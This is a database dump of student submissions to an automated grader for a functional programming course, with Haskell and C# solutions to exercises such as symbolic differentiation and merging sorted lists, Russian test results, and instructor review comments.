(3253, 87, '3742311', '2012-11-07 18:00:18', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval X t = t\r\neval (N c) t = c\r\neval (Add e1 e2) t = (eval e1 t) + (eval e2 t)\r\neval (Mult e1 e2) t = (eval e1 t) * (eval e2 t)', '<br/>Тесты успешно пройдены!'),
(3254, 88, '3742311', '2012-11-07 18:10:47', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = 1\r\ndiff (N c) = 0\r\ndiff (Add e1 e2) = (diff e1) + (diff e2)\r\ndiff (Mult e1 e2) = (Add (Mult (diff e1) e2) (Mult e1 (diff e2)))', 'Не удалось вычислить выражение "diff (Mult X X)", проверьте правильность синтаксиса'),
(3255, 87, '3742311', '2012-11-07 18:12:25', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = 1\r\ndiff (N c) = 0\r\ndiff (Add e1 e2) = (Add (diff e1) (diff e2))\r\ndiff (Mult e1 e2) = (Add (Mult (diff e1) e2) (Mult e1 (diff e2)))', 'Не удалось вычислить выражение "eval (Add (N 3) (Mult X X)) 10", проверьте правильность синтаксиса'),
(3256, 88, '3742311', '2012-11-07 18:13:36', 2, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = 1\r\n   --- Ответ действительно дб 1, но это не та единица:) Ответ же должен быть типа Expr, тут дб единица \r\n   --- в Expr, так сказать\r\ndiff (N c) = 0\r\ndiff (Add e1 e2) = (Add (diff e1) (diff e2))\r\ndiff (Mult e1 e2) = (Add (Mult (diff e1) e2) (Mult e1 (diff e2)))', 'Не удалось вычислить выражение "diff (Mult X X)", проверьте правильность синтаксиса'),
(3257, 85, '44060', '2012-11-07 18:56:21', 1, 'data Ration = Rat Integer Integer\r\ninstance Ord Ration where\r\n	(Rat m1 n1) < (Rat m2 n2) = if n1*n2 > 0 then m1*n2 < m2*n1\r\n										else m1*n2 > m2*n1\r\ninstance Eq Ration where\r\n	(Rat m1 n1) == (Rat m2 n2) = m1*n2 == m2*n1\r\n\r\ninstance Num Ration where\r\n	(Rat m1 n1) + (Rat m2 n2) = Rat (m1 * n2 + m2 * n1) (n1 * n2)\r\n\r\ninstance Show Ration where\r\n	show (Rat m n) = "("++show m++"/"++show n++")"\r\n   --- Вы зря тут скобки добавляете. У меня в тестах их нет, и из-за этого была ошибка ', 'Выражение имеет неправильное значение: Rat 1 2 + Rat 1 7'),
(3258, 91, '44060', '2012-11-07 19:37:45', 0, 'merge [] a = a\r\nmerge b [] = b\r\nmerge (a:as) (b:bs) =\r\n    if b < a then b : merge (a:as) bs   \r\n    else if a = b then a : merge as bs \r\n    else a : merge as (b:bs)\r\n', 'Не удалось вычислить выражение "merge [1,4,8] [2,4,5,10,20]", проверьте правильность синтаксиса'),
(3259, 93, '44060', '2012-11-07 19:39:54', 0, 'merge [] a = a\r\nmerge b [] = b\r\nmerge (a:as) (b:bs) =\r\n    if b < a then b : merge (a:as) bs   \r\n    else if a = b then a : merge as bs \r\n    else a : merge as (b:bs)\r\n\r\nham = 1 : merge (map (* 3) ham) (map (* 10) ham)', 'Не удалось вычислить выражение "take 10 ham", проверьте правильность синтаксиса'),
(3260, 91, '44060', '2012-11-07 19:41:09', 1, 'merge [] a = a\r\nmerge b [] = b\r\nmerge (a:as) (b:bs) =\r\n    if b < a then b : merge (a:as) bs   \r\n    else if a == b then a : merge as bs \r\n    else a : merge as (b:bs)\r\n', '<br/>Тесты успешно пройдены!'),
(3261, 93, '44060', '2012-11-07 19:42:04', 1, 'merge [] a = a\r\nmerge b [] = b\r\nmerge (a:as) (b:bs) =\r\n    if b < a then b : merge (a:as) bs   \r\n    else if a == b then a : merge as bs \r\n    else a : merge as (b:bs)\r\n\r\nham = 1 : merge (map (* 3) ham) (map (* 10) ham)', '<br/>Тесты успешно пройдены!'),
(3262, 82, '374969', '2012-11-07 21:37:49', 0, 'contain x = any (a -> a==x)\r\n\r\nbuildf lst = foldr ((a,b) f -> (x -> f (if(f a==a)then if(x==a)then b\r\n                                                                 else x\r\n                                                    else if(x==b)then a\r\n                                                                 else x))\r\n                   ) id lst\r\n\r\ncountDifferentVars pairlst lst = foldr (x y -> if(contain (f x) y)then y else (f x):y) [] lst\r\n                                 where f = buildf pairlst\r\n', 'Выражение имеет неправильное значение: countDifferentVars [([''x''],[''y''])] [[''x'']]'),
(3263, 82, '374969', '2012-11-07 22:10:45', 0, 'contain x = any (a -> a==x)\r\n\r\nbuildf lst = foldr ((a,b) f -> (x -> f (if(f a==a)then if(x==a)then b\r\n                                                                 else x\r\n                                                    else if(x==b)then a\r\n                                                                 else x))\r\n                   ) id lst\r\n\r\ncountDifferentVars pairlst lst = length (foldr (x y -> if(contain (f x) y)then y else (f x):y) [] lst)\r\n                                 where f = buildf pairlst', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(3264, 82, '374969', '2012-11-07 22:27:27', 0, 'contain x lst = any (y -> y==x) lst\r\n\r\nbuildf lst = foldr ((a,b) f -> (x -> if(f a==a)then if(x==a)then f b\r\n                                                            else f x\r\n                                               else if(x==b)then f a\r\n                                                            else f x)\r\n                   ) id lst\r\n\r\ncountDifferentVars pairlst lst = length (foldr (x y -> if(contain (f x) y)then y else (f x):y) [] lst)\r\n                                 where f = buildf pairlst', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3265, 91, '12206137', '2012-11-07 23:23:48', 1, 'merge [] x = x\r\n\r\nmerge x [] = x\r\n\r\nmerge (f@(x:xs)) (s@(y:ys)) =\r\n\r\n    if x < y then x : merge xs s\r\n\r\n    else if y < x then y : merge f ys\r\n\r\n    else x : merge xs ys\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3266, 86, '12206137', '2012-11-07 23:28:02', 1, 'nondivisible'' cond (x:xs)\r\n\r\n    | cond x = nondivisible'' (y -> cond y && mod x y /= 0 && mod y x /= 0) xs\r\n\r\n    | otherwise = False\r\n\r\nnondivisible'' _ _ = True\r\n\r\n\r\n\r\nallNondivisible = nondivisible'' (x -> True)\r\n', '<br/>Тесты успешно пройдены!'),
(3267, 87, '12206137', '2012-11-07 23:31:14', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\n\r\n\r\neval expr val =\r\n\r\n    case expr of\r\n\r\n        X -> val\r\n\r\n        N n -> n\r\n\r\n        Add a b -> eval a val + eval b val\r\n\r\n        Mult a b -> eval a val * eval b val\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3268, 88, '12206137', '2012-11-07 23:35:41', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\ndiff X = N 1\r\n\r\ndiff (N _) = N 0\r\n\r\ndiff (Add a b) = Add (diff a) (diff b)\r\n\r\ndiff (Mult a b) = Add (Mult (diff a) b) (Mult a (diff b))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3269, 89, '12206137', '2012-11-07 23:44:22', 1, '(|>) x f = f x\r\n\r\n\r\n\r\ndata Tree = Empty | Node Int Tree Tree\r\n\r\n\r\n\r\nflatten'' acc Empty = acc\r\n\r\nflatten'' acc (Node val left right) =\r\n\r\n    flatten'' acc right\r\n\r\n    |> (acc -> flatten'' acc left)\r\n\r\n    |> (acc -> val : acc)\r\n   --- Имело смысл, видимо, сделать acc вторым параметром, тогда можно было бы короче написать\r\n   --- flatten'' (Node val left right) =\r\n   ---    (val:) . flatten'' left . flatten'' right\r\n\r\nflatten = flatten'' []', '<br/>Тесты успешно пройдены!'),
(3270, 82, '374969', '2012-11-07 23:50:41', 0, 'contain x lst = any (y -> y==x) lst\r\n\r\nbuildf lst = foldr ((a,b) f -> (x -> if(f a==a)then if(x==a)then f b\r\n                                                              else f x\r\n                                                 else if(f a==x)then f b\r\n										                        else f x)\r\n                   ) id lst\r\n\r\ncountDifferentVars pairlst lst = length (foldr (x y -> if(contain (f x) y)then y else (f x):y) [] lst)\r\n                                 where f = buildf pairlst', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3271, 90, '12206137', '2012-11-07 23:59:33', 1, 'import Data.List\r\n\r\n\r\n\r\n(|>) x f = f x\r\n\r\n(.>) g f x = f (g x)\r\n\r\n\r\n\r\nfindSame :: Ord a => [a] -> [a]\r\n\r\nfindSame =\r\n\r\n    let\r\n\r\n        inner acc [] = acc\r\n\r\n        inner acc [_] = acc\r\n\r\n        inner acc (x1:x2:xs)\r\n\r\n            | x1 == x2 = inner (x1:acc) (xs |> dropWhile (== x1))\r\n\r\n            | otherwise = inner acc (x2:xs)\r\n      --- Тут я бы не стал использовать хвостовую рекурсию. Потому что если нам, скорее всего, надо только\r\n      --- один повторяющиийся элемент, о ползно иметь функцию, которая, как только найдет этот элемент,\r\n      --- так сразу его вернет (а остальные будет искать только по требованию). А в вашем решении, вроде бы\r\n      --- всегда точно находятся все повторяющиеся элементы, прежде чем что-то вернется пользователю.\r\n    in\r\n\r\n    sort .> inner []\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3272, 83, '12206137', '2012-11-08 00:13:49', 0, 'using System;\r\n\nusing System.Collections.Generic;\r\n\n\r\n\nnamespace Work {\r\n\n    class Program {\r\n\n        static int[] nums = {2,3,9};\r\n\n        public static IEnumerable<int> Lst239() {\r\n\n            foreach (var x in nums) {\r\n\n                yield return x;\r\n\n            }\r\n\n            foreach (int i in Lst239()) {\r\n\n                foreach (var x in nums) {\r\n\n                    yield return i * 10 + x;\r\n\n                }\r\n\n            }\r\n\n        }\r\n\n        public static void Main(string[] args) {\r\n\n            int cnt = 30;\r\n\n            foreach (int i in Lst239()) {\r\n\n                if (cnt-- == 0) break;\r\n\n                Console.Write(i + " ");\r\n\n            }\r\n\n        }\r\n\n    }\r\n\n}\n', '<br/>Тесты успешно пройдены!'),
(3273, 84, '12206137', '2012-11-08 00:19:10', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Work {\r\n\r\n    class Program {\r\n\r\n        public static IEnumerable<double> Iterate(double fst, Func<double, double> f) {\r\n\r\n            while (true) {\r\n\r\n                yield return fst;\r\n\r\n                fst = f(fst);\r\n\r\n            }\r\n\r\n        }\r\n\r\n        public static void Main(string[] args) {\r\n\r\n            foreach (double x in Iterate(2, x => x*2))\r\n\r\n            {\r\n\r\n                Console.Write(x + " ");\r\n\r\n                if (x > 1000000) break;\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3274, 85, '6774563', '2012-11-08 00:22:14', 1, 'data Ration = Rat Int Int\r\ninstance Num Ration where\r\n	(Rat n1 d1) + (Rat n2 d2) = let n=n1*d2+n2*d1\r\n					d=d1*d2\r\n					g=gcd n d\r\n						in Rat (n `div` g) (d `div` g)\r\ninstance Eq Ration where\r\n	(Rat n1 d1) == (Rat n2 d2) = n1*d2 == n2*d1\r\ninstance Ord Ration where\r\n	(Rat n1 d1) < (Rat n2 d2)	| n1*d1 >= 0 && n2*d2 >= 0 = abs (n1*d2) < abs (n2*d1)\r\n					| n1*d1 < 0 && n2*d2 < 0   = abs (n1*d2) > abs (n2*d1)\r\n					| n1*d1 < 0 && n2*d2 >= 0  = True\r\n					| otherwise                = False\r\ninstance Show Ration where\r\n	show (Rat n d) | d == 0         = "error: zero denominator"\r\n	show (Rat n d) | n*d < 0        = "-" ++ show (Rat (-n) d)\r\n	show (Rat n d) | n `mod` d == 0 = show (n `div` d)\r\n	show (Rat n d) | otherwise      = show n ++ "/" ++ show d\r\n', '<br/>Тесты успешно пройдены!'),
(3275, 86, '6774563', '2012-11-08 00:23:12', 1, 'allNondivisible xs = allNondivisible'' xs (const True)\r\n\r\nallNondivisible'' [] cond = True\r\nallNondivisible'' (x:xs) cond = if not (cond x) then False else allNondivisible'' xs (	 -> cond t && t `mod` x /= 0 && x `mod` t /= 0)\r\n', '<br/>Тесты успешно пройдены!'),
(3276, 87, '6774563', '2012-11-08 00:23:34', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval X n = n\r\neval (N i) n = i\r\neval (Add e1 e2) n = eval e1 n + eval e2 n\r\neval (Mult e1 e2) n = eval e1 n * eval e2 n\r\n', '<br/>Тесты успешно пройдены!'),
(3277, 88, '6774563', '2012-11-08 00:24:19', 1, '-- Вообще, производная же derivative, der, наверное, а не diff\r\n  --- В принципе вы правы, да, хорошее замечение. С другой стороны, процесс взятия\r\n  --- производной - это differrentiation, так что какой то смысл в моем названии есть)\r\n\r\ndata Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\r\n', '<br/>Тесты успешно пройдены!'),
(3278, 89, '6774563', '2012-11-08 00:24:57', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nflatten t = flatten'' t [] \r\n\r\nflatten'' Empty acc = acc\r\nflatten'' (Node x l r) acc = x:(flatten'' l (flatten'' r acc))\r\n', '<br/>Тесты успешно пройдены!'),
(3279, 90, '6774563', '2012-11-08 00:25:23', 1, 'import Data.List\r\n\r\n-- Я использую Maybe\r\nfindSame xs = fst (foldr doSearch (Nothing,[]) xs) where\r\n	doSearch x (Nothing, xs'') = (find (==x) xs'', x:xs'')\r\n	doSearch x (j, xs'') = (j, x:xs'')\r\n', '<br/>Тесты успешно пройдены!'),
(3280, 91, '6774563', '2012-11-08 00:25:42', 0, 'merge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys)	| x < y     = x:merge xs (y:ys)\r\n			| otherwise = y:merge (x:xs) ys\r\n', 'Выражение имеет неправильное значение: merge [1,4,8] [2,4,5,10,20]'),
(3281, 91, '6774563', '2012-11-08 00:27:11', 1, 'merge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys)	| x == y    = x:merge xs ys\r\n			| x < y     = x:merge xs (y:ys)\r\n			| otherwise = y:merge (x:xs) ys\r\n', '<br/>Тесты успешно пройдены!'),
(3282, 95, '12206137', '2012-11-08 00:30:09', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Work {\r\n\r\n    class Program {\r\n\r\n        public static bool allDifferent(int[] a)\r\n\r\n        {\r\n\r\n            Func<int, bool> cond = x => true;\r\n\r\n            for(int i = 0; i < a.Length; i++) {\r\n\r\n                var x = a[i];\r\n\r\n                if (!cond(x)) return false;\r\n\r\n                var f = cond;\r\n\r\n                cond = y => f(y) && x != y;\r\n\r\n            }\r\n\r\n            return true;\r\n\r\n        }\r\n\r\n        public static void Main(string[] args) {\r\n\r\n            int[] a = {1,2,3,4,2,3,5};\r\n\r\n            Console.WriteLine(allDifferent(a));\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3283, 82, '374969', '2012-11-08 00:44:58', 0, 'contain x lst = any (y -> y==x) lst\r\n\r\n--1->2\r\n--3->4\r\n--1->3->4\r\nwrap  (a, b) f = x -> if(x==a)  then f b else f x\r\nwrapf (a, b) f = if(f a==a)then wrap (a, b) f\r\n				           else wrap (a, b) (wrapf (f a, b) f)\r\nbuildf lst = foldr wrapf id lst\r\n\r\ncountDifferentVars pairlst lst = length (foldr (x y -> if(contain (f x) y)then y else (f x):y) [] lst)\r\n                                 where f = buildf pairlst', '<br/>Тесты успешно пройдены!'),
(3284, 93, '6774563', '2012-11-08 00:47:53', 1, '-- на слабеньком нетбуке работает 0.03 секунды :)\r\n   --- Я знаю) 30 секунд я написал просто потому, что в систем тестирования таймер 30 сек.)\r\n\r\nham = 1:merge (map (*3) ham) (map (*10) ham)\r\n\r\nmerge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys)	| x == y    = x:merge xs ys\r\n			| x < y     = x:merge xs (y:ys)\r\n			| otherwise = y:merge (x:xs) ys\r\n', '<br/>Тесты успешно пройдены!'),
(3285, 96, '12206137', '2012-11-08 00:53:04', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Work {\r\n\r\n    class Program {\r\n\r\n        public static IEnumerable<int> Merge (IEnumerable<int> a, IEnumerable<int> b) {\r\n\r\n            var sndEnum = b.GetEnumerator();\r\n\r\n            var isCont = sndEnum.MoveNext();\r\n\r\n            foreach (var i in a) {\r\n\r\n                while (isCont && sndEnum.Current <= i) {\r\n\r\n                    var j = sndEnum.Current;\r\n\r\n                    if (j < i) {\r\n\r\n                        yield return j;\r\n\r\n                    }\r\n\r\n                    isCont = sndEnum.MoveNext();\r\n\r\n                }\r\n\r\n                yield return i;\r\n\r\n            }\r\n\r\n            if (isCont) {\r\n\r\n                yield return sndEnum.Current;\r\n\r\n                while (sndEnum.MoveNext()) {\r\n\r\n                    yield return sndEnum.Current;\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n        public static void Main(string[] args) {\r\n\r\n            int [] a = { 1, 5, 8 }, b = { 3, 5, 9 };\r\n\r\n            foreach (int i in Merge(a, b)) {\r\n\r\n                Console.WriteLine(i);\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3286, 82, '374969', '2012-11-08 00:56:58', 2, '  --- Не совсем правильно, вот такой тест например не проходит:\r\n  --- countDifferentVars [("x","y"),("x","z"),("a","b"),("z","b")] ["x","y","a","b"]\r\n  --- (Такого теста не было, но я его сейчас добавлю)\r\n\r\n--немного приведено к функциональному виду\r\ncontain x lst = any (y -> y==x) lst\r\n\r\n--1->2\r\n--3->4\r\n--1->3->4\r\nwrap  (a, b) f = x -> f (if(x==a)then b else x)\r\nwrapf (a, b) f =  wrap (a, b) (if(f a==a)then f else wrapf (f a, b) f)\r\nbuildf lst = foldr wrapf id lst\r\n\r\ncountDifferentVars pairlst lst = length (foldr (x y -> if(contain (f x) y)then y else (f x):y) [] lst)\r\n                                 where f = buildf pairlst', '<br/>Тесты успешно пройдены!'),
(3287, 94, '6774563', '2012-11-08 02:59:58', 1, '--module Main where\r\n\r\n\r\n\r\nimport Data.List\r\n\r\n\r\n\r\ndata Scheme = R Int | Serial [Scheme] | Parallel [Scheme]\r\n\r\n\r\n\r\nwireLen = 2\r\n\r\n\r\n\r\ninstance Show Scheme where\r\n\r\n	show s = "-----------<scheme>-----------\r\n" ++ unlines (showLines s) ++ "------------------------------\r\n"\r\n\r\n\r\n\r\nshowLines (R n) = [show n]\r\n\r\nshowLines (Serial xs) = concatBlocks alignedSubschemes where\r\n\r\n	subschemes = map (showLines) xs\r\n\r\n	maxheight = maximum (map (length) subschemes)\r\n\r\n	alignedSubschemes = map (`alignV` maxheight) (placeMiddles [hwire] subschemes)\r\n\r\nshowLines (Parallel xs) = concatBlocks [verticalWire, alignedSubschemes, verticalWire] where\r\n\r\n	subschemes = map (showLines) xs\r\n\r\n	maxwidth = maximum (map (length.head) subschemes) + 2*wireLen\r\n\r\n	alignedSubschemes = concat (placeMiddles [replicate maxwidth '' ''] (map (`alignH` maxwidth) subschemes))\r\n\r\n	verticalWire = let (result, _, _) = verticalWire'' in result\r\n\r\n	verticalWire'' = foldr makeSymb ([], False, length subschemes) alignedSubschemes where\r\n\r\n		makeSymb s (xs, meet, n) | head s == ''-'' = ("+":xs, True, n-1)\r\n\r\n					 | meet && n > 0 = ("|":xs, meet, n)\r\n\r\n					 | otherwise     = (" ":xs, meet, n)\r\n\r\n\r\n\r\nhwire = replicate wireLen ''-''\r\n\r\n\r\n\r\n-- Соединяет блоки из линий в одну последовательность линий\r\n\r\nconcatBlocks a = foldr (zipWith (++)) (replicate (length (head a)) "") a\r\n\r\n\r\n\r\n-- Помещает s между каждыми элементами и по концам в a (5 [1,2,3] -> [5,1,5,2,5,3,5])\r\n\r\nplaceMiddles s a = s:placeMiddles'' s a\r\n\r\nplaceMiddles'' s [] = []\r\n\r\nplaceMiddles'' s (x:xs) = x:s:placeMiddles'' s xs\r\n\r\n\r\n\r\n-- Выравнивает по центру набор строк, добивая его пустыми строками сверху и снизу\r\n\r\nalignV [] space = replicate space ""\r\n\r\nalignV a space = replicate b empty ++ a ++ replicate e empty where\r\n\r\n	empty = replicate (length (head a)) '' ''\r\n\r\n	b = (space - length a) `div` 2\r\n\r\n	e = space - length a - b\r\n\r\n\r\n\r\n-- Выравнивает по центру набор строк, добивая его проводами слева и справа\r\n\r\nalignH [] _ = []\r\n\r\nalignH a space = concatBlocks [alignV [begWire] h, a, alignV [endWire] h] where\r\n\r\n	h = length a\r\n\r\n	l = length (head a)\r\n\r\n	b = (space - l) `div` 2\r\n\r\n	begWire = replicate b ''-''\r\n\r\n	endWire = replicate (space - l - b) ''-''\r\n\r\n\r\n\r\n--main = putStrLn $ show $ Serial[R 5, Parallel [Serial [R 1, Parallel [R 10, Serial [R 1, R 2, R 3], Serial [R 10, R 20]], R 3], Serial [R 100000, R 200000000], R 40000, R 40001, Parallel [R 1, R 2, R 3] ], R 6]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3288, 95, '6774563', '2012-11-08 12:49:46', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace task24_1\r\n\r\n{\r\n\r\n    // Полезная вещь - пожалуй, вынесу как экстеншн, может где дальше понадобится\r\n        --- OK)\r\n    public static class EnumerableExtensions\r\n\r\n    {\r\n\r\n        public static bool AllDifferent<T>(this IEnumerable<T> list) where T: IComparable\r\n\r\n        {\r\n\r\n            return AllDifferentImpl(list, t => true);\r\n        }\r\n\r\n\r\n\r\n        private static bool AllDifferentImpl<T>(IEnumerable<T> list, Predicate<T> cond) where T : IComparable\r\n\r\n        {\r\n\r\n            if (!list.Any())\r\n\r\n            {\r\n\r\n                return true;\r\n\r\n            }\r\n\r\n            T head = list.First();\r\n\r\n            if (!cond(head))\r\n\r\n            {\r\n\r\n                return false;\r\n\r\n            }\r\n\r\n            return AllDifferentImpl(list.Skip(1), t => cond(t) && t.CompareTo(head) != 0);\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n    internal sealed class Program\r\n\r\n    {\r\n\r\n        private static void Main()\r\n\r\n        {\r\n\r\n            Console.WriteLine(new[] {1, 2, 3, 2, 5}.AllDifferent());\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3289, 96, '6774563', '2012-11-08 13:06:31', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace task24_2\r\n\r\n{\r\n\r\n    internal sealed class Program\r\n\r\n    {\r\n\r\n        private static IEnumerable<T> Merge<T>(IEnumerable<T> list1, IEnumerable<T> list2) where T: IComparable\r\n\r\n        {\r\n\r\n            var enum1 = list1.GetEnumerator();\r\n\r\n            var enum2 = list2.GetEnumerator();\r\n\r\n            bool list1Empty = !enum1.MoveNext();\r\n\r\n            bool list2Empty = !enum2.MoveNext();\r\n\r\n            while (true)\r\n\r\n            {\r\n\r\n                if (list1Empty)\r\n\r\n                {\r\n\r\n                    if (list2Empty)\r\n\r\n                    {\r\n\r\n                        yield break;\r\n\r\n                    }\r\n\r\n                    yield return enum2.Current;\r\n\r\n                    list2Empty = !enum2.MoveNext();\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    if (list2Empty)\r\n\r\n                    {\r\n\r\n                        yield return enum1.Current;\r\n\r\n                        list1Empty = !enum1.MoveNext();\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                    {\r\n\r\n                        int c = enum1.Current.CompareTo(enum2.Current);\r\n\r\n                        if (c == 0)\r\n\r\n                        {\r\n\r\n                            yield return enum1.Current;\r\n\r\n                            list1Empty = !enum1.MoveNext();\r\n\r\n                            list2Empty = !enum2.MoveNext();\r\n\r\n                        }\r\n\r\n                        else if (c < 0)\r\n\r\n                        {\r\n\r\n                            yield return enum1.Current;\r\n\r\n                            list1Empty = !enum1.MoveNext();\r\n\r\n                        }\r\n\r\n                        else\r\n\r\n                        {\r\n\r\n                            yield return enum2.Current;\r\n\r\n                            list2Empty = !enum2.MoveNext();\r\n\r\n                        }\r\n\r\n                    }\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 8 };\r\n\r\n            int[] b = { 3, 5, 9 };\r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                Console.WriteLine(i); // Должно напечататься 1, 3, 5, 8, 9\r\n\r\n            }\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3290, 82, 'jogrms', '2012-11-08 13:46:55', 0, 'countDifferentVars dic xs = let\r\n    triples = zipWith ((x,y) i -> (i,x,y)) dic $ map show [1..]\r\n    arrangedTriples = arrange triples\r\n    replaced = map (getTag arrangedTriples) xs\r\n    in length $ nub $replaced\r\n\r\n    where\r\n        arrange [] = []\r\n        arrange (x:xs) = x:arrange (setTag x xs)\r\n        \r\n        setTag _ [] = []\r\n        setTag (tx,x1,x2) ((ty,y1,y2):ys) = \r\n            let cond = x1 == y1 || x1 == y2 || x2 == y1 || x2 == y2\r\n                rem = setTag (tx, x1,x2) ys in\r\n            if cond then (tx,y1,y2):rem else (ty,y1,y2):rem\r\n\r\n        getTag [] x = x\r\n        getTag ((t,d1,d2):ds) x\r\n            | x == d1   = t\r\n            | x == d2   = t\r\n            | otherwise = getTag ds x\r\n\r\n        nub l = nub'' l [] where \r\n            nub'' [] _ = []\r\n            nub'' (x:xs) ls\r\n                | x `elem` ls = nub'' xs ls\r\n                | otherwise   = x : nub'' xs (x:ls)\r\n', 'Не удалось вычислить выражение "countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]", проверьте правильность синтаксиса'),
(3291, 82, 'jogrms', '2012-11-08 13:50:26', 0, 'countDifferentVars dic xs = let\r\n    triples = map ((x,y) -> (x,x,y)) dic\r\n    arrangedTriples = arrange triples\r\n    replaced = map (getTag arrangedTriples) xs\r\n    in length $ nub $replaced\r\n\r\n    where\r\n        arrange [] = []\r\n        arrange (x:xs) = x:arrange (setTag x xs)\r\n        \r\n        setTag _ [] = []\r\n        setTag (tx,x1,x2) ((ty,y1,y2):ys) = \r\n            let cond = x1 == y1 || x1 == y2 || x2 == y1 || x2 == y2\r\n                rem = setTag (tx, x1,x2) ys in\r\n            if cond then (tx,y1,y2):rem else (ty,y1,y2):rem\r\n\r\n        getTag [] x = x\r\n        getTag ((t,d1,d2):ds) x\r\n            | x == d1   = t\r\n            | x == d2   = t\r\n            | otherwise = getTag ds x\r\n\r\n        nub l = nub'' l [] where \r\n            nub'' [] _ = []\r\n            nub'' (x:xs) ls\r\n                | x `elem` ls = nub'' xs ls\r\n                | otherwise   = x : nub'' xs (x:ls)', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3292, 91, '374969', '2012-11-08 14:05:23', 1, 'merge [] lst = lst\r\nmerge lst [] = lst\r\nmerge (hd1:tl1) (hd2:tl2) = if(hd1==hd2)then hd1:(merge tl1 tl2) else if(hd1<hd2)then hd1:(merge tl1 (hd2:tl2)) else hd2:(merge (hd1:tl1) tl2)', '<br/>Тесты успешно пройдены!'),
(3293, 82, 'jogrms', '2012-11-08 15:09:15', 0, 'countDifferentVars dic = length . nub . map (getTag $ merge dic) where\r\n    getTag [] x = x\r\n    getTag (as:dic) x\r\n        | x `elem` as = head as\r\n        | otherwise   = getTag dic x\r\n\r\n    nub l = nub'' l [] where\r\n        nub'' [] _ = []\r\n        nub'' (x:xs) ls\r\n            | x `elem` ls   = nub'' xs ls\r\n            | otherwise     = x : nub'' xs (x:ls)\r\n\r\n    merge :: (Eq a) => [(a,a)] -> [[a]]\r\n    merge d = merge'' [] [] d where\r\n        merge'' acc dh (d:ds) = let (done, acc1) = ch acc d in\r\n            if done then merge'' acc1 [] (dh ++ ds)\r\n                    else merge'' acc (d:dh) ds\r\n        merge'' acc ((a,b):dh) [] = merge'' ([a,b]:acc) [] dh\r\n        merge'' acc [] [] = acc\r\n\r\n        ch [] _ = (False, [])\r\n        ch (as:acc) (x,y)\r\n            | x `elem` as = (True, (y:as):acc)\r\n            | y `elem` as = (True, (x:as):acc)\r\n            | otherwise   = let (done, acc1) = ch acc (x,y) in (done, as:acc1):acc1)', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
